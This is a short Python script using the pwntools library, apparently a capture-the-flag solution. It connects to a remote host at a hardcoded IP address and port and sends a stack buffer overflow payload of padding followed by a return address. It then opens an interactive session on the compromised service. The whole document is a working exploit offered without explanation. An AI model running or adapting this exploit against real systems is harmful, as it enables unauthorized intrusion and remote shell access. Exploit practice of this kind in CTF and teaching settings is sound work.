from pwn import *

p=remote('220.249.52.133',43553)
payload='a'*0x88+p64(0x400596)
p.sendline(payload)
p.interactive()